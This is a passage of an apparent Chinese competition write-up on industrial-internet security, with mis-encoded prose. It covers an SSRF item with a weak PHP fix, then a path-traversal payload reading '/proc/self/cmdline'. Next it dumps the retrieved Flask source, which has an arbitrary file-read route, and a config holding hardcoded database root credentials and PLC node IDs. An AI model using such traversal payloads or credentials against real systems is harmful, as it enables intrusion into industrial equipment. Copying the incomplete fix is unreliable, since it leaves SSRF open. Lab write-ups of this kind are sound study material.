curl_exec($ch);</code>è¿™é‡Œå¯ä»¥éšä¾¿ssrf</p></li><li><p>å¦‚æœè¦å¯¹ä»£ç è¿›è¡Œä¿®å¤ï¼Œåº”è¯¥åšå‡ºæ€æ ·ä¿®æ”¹ï¼šç®€å•è¿‡æ»¤ä¸€æ‰‹</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'POST'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_URL</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token keyword type-declaration">false</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^(https?|ftp):\/\/.[^\s]*$/'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$error</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"æ— æ•ˆçš„ URLï¼Œè¯·æ£€æŸ¥æ ¼å¼ã€‚"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_FOLLOWLOCATION</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_MAXREDIRS</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$response</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$error</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'cURL é”™è¯¯: '</span> <span class="token operator">.</span> <span class="token function">curl_error</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><hr><h1 id="æ¸—é€-æ•°å­—åŒ–è£…é…åœºæ™¯"><a href="#æ¸—é€-æ•°å­—åŒ–è£…é…åœºæ™¯" class="headerlink" title="æ¸—é€-æ•°å­—åŒ–è£…é…åœºæ™¯"></a>æ¸—é€-æ•°å­—åŒ–è£…é…åœºæ™¯</h1><p>æ—¥å¿—å¤„å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–ï¼Œç”šè‡³å¯ä»¥åˆ—å‡ºç›®å½•</p><p><img src="/blog/2024/11/28/2024%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/image-20241128140416081.png" alt="image-20241128140416081"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/proc/self/cmdline<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/11/28/2024%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/image-20241128140838919.png" alt="image-20241128140838919"></p><p>è¯»å–çš„æ—¥å¿—æœ‰æœ€å¤§é•¿åº¦</p><p>..&#x2F;data_monitor.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""opc-uaç±»: å®ç°å·¥ä¸šæœºå™¨äº¤äº’opc-uaå®‰è£…ä½¿ç”¨æ–¹å¼ï¼špip install opcuaopencv-python"""</span><span class="token keyword">import</span> os<span class="token keyword">import</span> tempfile<span class="token keyword">import</span> threading<span class="token keyword">import</span> time<span class="token keyword">import</span> datetime<span class="token keyword">import</span> json<span class="token keyword">from</span> functools <span class="token keyword">import</span> wraps<span class="token keyword">from</span> itertools <span class="token keyword">import</span> islice<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> send_file<span class="token punctuation">,</span> request<span class="token punctuation">,</span> Response<span class="token punctuation">,</span> make_response<span class="token keyword">from</span> flask_cors <span class="token keyword">import</span> CORS<span class="token keyword">from</span> opcua <span class="token keyword">import</span> Client<span class="token punctuation">,</span> ua<span class="token punctuation">,</span> Node<span class="token keyword">import</span> cv2<span class="token keyword">from</span> base_info <span class="token keyword">import</span> sub_ids<span class="token punctuation">,</span> ip<span class="token punctuation">,</span> port<span class="token punctuation">,</span> host<span class="token punctuation">,</span> user<span class="token punctuation">,</span> pw<span class="token punctuation">,</span> database<span class="token keyword">from</span> get_generate_plan <span class="token keyword">import</span> get_random_plan<span class="token keyword">from</span> update_value <span class="token keyword">import</span> monitor_task<span class="token keyword">from</span> mysql_db <span class="token keyword">import</span> MySQLDatabaseapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>CORS<span class="token punctuation">(</span>app<span class="token punctuation">,</span> resources<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">r"/*"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token string">"origins"</span><span class="token punctuation">:</span> <span class="token string">"*"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>abs_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>abs_path<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/dashboard"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_monitor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> MySQLDatabase<span class="token punctuation">(</span>host<span class="token punctuation">,</span> user<span class="token punctuation">,</span> pw<span class="token punctuation">,</span> database<span class="token punctuation">)</span> <span class="token keyword">as</span> db<span class="token punctuation">:</span>            data <span class="token operator">=</span> db<span class="token punctuation">.</span>execute_query<span class="token punctuation">(</span><span class="token string">"SELECT name_key, content FROM monitor"</span><span class="token punctuation">,</span><span class="token punctuation">)</span>            info <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token builtin">zip</span><span class="token punctuation">(</span><span class="token punctuation">[</span>x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> data<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> data<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'code'</span><span class="token punctuation">:</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token string">'data'</span><span class="token punctuation">:</span> info<span class="token punctuation">&#125;</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'code'</span><span class="token punctuation">:</span> <span class="token number">500</span><span class="token punctuation">,</span> <span class="token string">'data'</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/plan"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_plan</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        plan_list <span class="token operator">=</span> get_random_plan<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'code'</span><span class="token punctuation">:</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token string">'data'</span><span class="token punctuation">:</span> plan_list<span class="token punctuation">&#125;</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'code'</span><span class="token punctuation">:</span> <span class="token number">500</span><span class="token punctuation">,</span> <span class="token string">'data'</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/get_log"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_log</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    filename <span class="token operator">=</span> request<span class="token punctuation">.</span>json<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span>    file_path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>abs_path<span class="token punctuation">&#125;</span></span><span class="token string">/log/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>filename<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isdir<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                lines <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>islice<span class="token punctuation">(</span>f<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">with</span> tempfile<span class="token punctuation">.</span>NamedTemporaryFile<span class="token punctuation">(</span>delete<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'w'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> temp_file<span class="token punctuation">:</span>                temp_file<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span>lines<span class="token punctuation">)</span>                temp_file_path <span class="token operator">=</span> temp_file<span class="token punctuation">.</span>name            response <span class="token operator">=</span> make_response<span class="token punctuation">(</span>send_file<span class="token punctuation">(</span>temp_file_path<span class="token punctuation">)</span><span class="token punctuation">)</span>            response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'application/json'</span>            <span class="token keyword">return</span> response        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"æ–‡ä»¶ä¸å­˜åœ¨"</span><span class="token punctuation">,</span> <span class="token number">400</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> Response<span class="token punctuation">(</span>            json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>abs_path<span class="token punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>filename<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            content_type<span class="token operator">=</span><span class="token string">"application/json"</span><span class="token punctuation">,</span>            headers<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"application/json"</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">VideoCamera</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">,</span> account<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">,</span> passwd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"rtsp://</span><span class="token interpolation"><span class="token punctuation">&#123;</span>account<span class="token punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>passwd<span class="token punctuation">&#125;</span></span><span class="token string">@</span><span class="token interpolation"><span class="token punctuation">&#123;</span>host<span class="token punctuation">&#125;</span></span><span class="token string">:554/Streaming/Channels/1"</span></span>        self<span class="token punctuation">.</span>video <span class="token operator">=</span> cv2<span class="token punctuation">.</span>VideoCapture<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">)</span>    <span class="token decorator annotation punctuation">@property</span>    <span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>video<span class="token punctuation">.</span>isOpened<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">def</span> <span class="token function">__del__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>video<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">get_frame</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        success<span class="token punctuation">,</span> image <span class="token operator">=</span> self<span class="token punctuation">.</span>video<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        ret<span class="token punctuation">,</span> jpeg <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imencode<span class="token punctuation">(</span><span class="token string">'.jpg'</span><span class="token punctuation">,</span> image<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>cv2<span class="token punctuation">.</span>IMWRITE_JPEG_QUALITY<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> jpeg<span class="token punctuation">.</span>tobytes<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>..&#x2F;mysql_db.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> mysql<span class="token punctuation">.</span>connector<span class="token keyword">class</span> <span class="token class-name">MySQLDatabase</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> host<span class="token punctuation">,</span> user<span class="token punctuation">,</span> password<span class="token punctuation">,</span> database<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>host <span class="token operator">=</span> host        self<span class="token punctuation">.</span>user <span class="token operator">=</span> user        self<span class="token punctuation">.</span>password <span class="token operator">=</span> password        self<span class="token punctuation">.</span>database <span class="token operator">=</span> database        self<span class="token punctuation">.</span>conn <span class="token operator">=</span> <span class="token boolean">None</span>        self<span class="token punctuation">.</span>cursor <span class="token operator">=</span> <span class="token boolean">None</span>    <span class="token keyword">def</span> <span class="token function">__enter__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>conn <span class="token operator">=</span> mysql<span class="token punctuation">.</span>connector<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>            host<span class="token operator">=</span>self<span class="token punctuation">.</span>host<span class="token punctuation">,</span>            user<span class="token operator">=</span>self<span class="token punctuation">.</span>user<span class="token punctuation">,</span>            password<span class="token operator">=</span>self<span class="token punctuation">.</span>password<span class="token punctuation">,</span>            database<span class="token operator">=</span>self<span class="token punctuation">.</span>database        <span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cursor <span class="token operator">=</span> self<span class="token punctuation">.</span>conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> self    <span class="token keyword">def</span> <span class="token function">__exit__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> exc_type<span class="token punctuation">,</span> exc_val<span class="token punctuation">,</span> exc_tb<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>cursor<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>cursor<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>conn<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">execute_query</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> query<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>query<span class="token punctuation">,</span> params<span class="token punctuation">)</span>        result <span class="token operator">=</span> self<span class="token punctuation">.</span>cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> result    <span class="token keyword">def</span> <span class="token function">update_record</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> query<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>query<span class="token punctuation">,</span> params<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>cursor<span class="token punctuation">.</span>lastrowid<span class="token triple-quoted-string string">""" ä½¿ç”¨withè¯­å¥è¿›è¡Œæ•°æ®åº“æ“ä½œwith MySQLDatabase(host='localhost', user='yourusername', password='yourpassword', database='mydatabase') as db:    result = db.execute_query("SELECT * FROM customers")    for x in result:        print(x)    updated_rows = db.update_record("UPDATE customers SET address = 'Canyon 123' WHERE address = 'Valley 345'")    print(updated_rows, "è®°å½•è¢«ä¿®æ”¹")"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>..&#x2F;base_info.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""sisç›‘æ§æ–‡ä»¶ç»Ÿä¸€æ”¾åˆ°  /home/opt/monitorç›®å½•ä¸‹miså‰ç«¯æ–‡ä»¶ç»Ÿä¸€æ”¾åˆ°  /var/www/html å¹¶æŒ‡å®šé»˜è®¤è®¿é—®é¡µé¢ä¸ºindex.php"""</span><span class="token comment"># mysql</span>host <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span>user <span class="token operator">=</span> <span class="token string">"root"</span>pw <span class="token operator">=</span> <span class="token string">"abc123!@#"</span>database <span class="token operator">=</span> <span class="token string">"mesdb"</span><span class="token comment"># ç»„æ€ç³»ç»Ÿä¿¡æ¯</span>ip <span class="token operator">=</span> <span class="token string">'192.168.2.32'</span>port <span class="token operator">=</span> <span class="token number">4862</span><span class="token comment"># ç›‘æ§èŠ‚ç‚¹æ•°æ®</span>sub_ids <span class="token operator">=</span> <span class="token punctuation">(</span>    <span class="token string">'ns=1;s=t|DLSSL'</span><span class="token punctuation">,</span>  <span class="token comment"># æ‰“èºä¸æ•°é‡</span>    <span class="token string">'ns=1;s=t|FTQS'</span><span class="token punctuation">,</span>  <span class="token comment"># å‘æ¡åœˆæ•°</span>    <span class="token string">'ns=1;s=t|FZJD'</span><span class="token punctuation">,</span>  <span class="token comment"># ç¿»è½¬è§’åº¦</span>    <span class="token string">'ns=1;s=t|FZZP_Run'</span><span class="token punctuation">,</span>  <span class="token comment"># ç¿»è½¬è£…é…è¿è¡Œ</span>    <span class="token comment"># 'ns=1;s=t|FZZP_Start',  # ç¿»è½¬è£…é…å¯åŠ¨</span>    <span class="token comment"># 'ns=1;s=t|FZZP_Stop',  # ç¿»è½¬è£…é…åœæ­¢</span>    <span class="token comment"># 'ns=1;s=t|hand',  # æ‰‹è‡ªåŠ¨æ¨¡å¼</span>    <span class="token string">'ns=1;s=t|HJ_SD'</span><span class="token punctuation">,</span>  <span class="token comment"># ç¯å¢ƒæ¹¿åº¦</span>    <span class="token string">'ns=1;s=t|HJ_WD'</span><span class="token punctuation">,</span>  <span class="token comment"># ç¯å¢ƒæ¸©åº¦</span>    <span class="token string">'ns=1;s=t|JGDB_Run'</span><span class="token punctuation">,</span>  <span class="token comment"># æ¿€å…‰æ‰“æ ‡è¿è¡Œ</span>    <span class="token comment"># 'ns=1;s=t|JGDB_Start',  # æ¿€å…‰æ‰“æ ‡å¯åŠ¨</span>    <span class="token comment"># 'ns=1;s=t|JGDB_Stop',  # æ¿€å…‰æ‰“æ ‡åœæ­¢</span>    <span class="token string">'ns=1;s=t|JGPL'</span><span class="token punctuation">,</span>  <span class="token comment"># æ¿€å…‰é¢‘ç‡</span>    <span class="token string">'ns=1;s=t|JXSL_Run'</span><span class="token punctuation">,</span>  <span class="token comment"># æœºèŠ¯ä¸Šæ–™è¿è¡Œ</span>    <span class="token comment"># 'ns=1;s=t|JXSL_Start',  # æœºèŠ¯ä¸Šæ–™å¯åŠ¨</span>    <span class="token comment"># 'ns=1;s=t|JXSL_Stop',  # æœºèŠ¯ä¸Šæ–™åœæ­¢</span>    <span class="token string">'ns=1;s=t|JZDL_Run'</span><span class="token punctuation">,</span>  <span class="token comment"># åŸºåº§æ‰“æ–™è¿è¡Œ</span>    <span class="token comment"># 'ns=1;s=t|JZDL_Start',  # åŸºåº§æ‰“æ–™å¯åŠ¨</span>    <span class="token comment"># 'ns=1;s=t|JZDL_Stop',  # åŸºåº§æ‰“æ–™åœæ­¢</span>    <span class="token string">'ns=1;s=t|SCSL'</span><span class="token punctuation">,</span>  <span class="token comment"># ç”Ÿäº§æ•°é‡</span>    <span class="token string">'ns=1;s=t|SGDLS_Run'</span><span class="token punctuation">,</span>  <span class="token comment"># ä¸Šç›–æ‰“èºä¸è¿è¡Œ</span>    <span class="token comment"># 'ns=1;s=t|SGDLS_Start',  # ä¸Šç›–æ‰“èºä¸å¯åŠ¨</span>    <span class="token comment"># 'ns=1;s=t|SGDLS_Stop',  # ä¸Šç›–æ‰“èºä¸åœæ­¢</span>    <span class="token string">'ns=1;s=t|SJSFT_Run'</span><span class="token punctuation">,</span>  <span class="token comment"># è§†è§‰ä¸Šå‘æ¡è¿è¡Œ</span>    <span class="token comment"># 'ns=1;s=t|SJSFT_Start',  # è§†è§‰ä¸Šå‘æ¡å¯åŠ¨</span>    <span class="token comment"># 'ns=1;s=t|SJSFT_Stop',  # è§†è§‰ä¸Šå‘æ¡åœæ­¢</span>    <span class="token string">'ns=1;s=t|SLSD'</span><span class="token punctuation">,</span>  <span class="token comment"># ä¸Šæ–™é€Ÿåº¦</span>    <span class="token string">'ns=1;s=t|tongxun_state'</span><span class="token punctuation">,</span>  <span class="token comment"># PLCé€šè®¯çŠ¶æ€</span>    <span class="token string">'ns=1;s=t|TPZY_Run'</span><span class="token punctuation">,</span>  <span class="token comment"># æ‰˜ç›˜è½¬è¿è¿è¡Œ</span>    <span class="token comment"># 'ns=1;s=t|TPZY_Start',  # æ‰˜ç›˜è½¬è¿å¯åŠ¨</span>    <span class="token comment"># 'ns=1;s=t|TPZY_Stop',  # æ‰˜ç›˜è½¬è¿åœæ­¢</span>    <span class="token string">'ns=1;s=t|YJ_Run'</span><span class="token punctuation">,</span>  <span class="token comment"># ä¸€é”®è¿è¡Œ</span>    <span class="token comment"># 'ns=1;s=t|YJ_Start',  # ä¸€é”®å¯åŠ¨</span>    <span class="token comment"># 'ns=1;s=t|YJ_Stop',  # ä¸€é”®åœæ­¢</span>    <span class="token string">'ns=1;s=t|ZN_M_OVERSPEED'</span><span class="token punctuation">,</span>  <span class="token comment"># ç”µæœºè¶…é€ŸæŠ¥è­¦</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>..&#x2F;update_value.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">import</span> 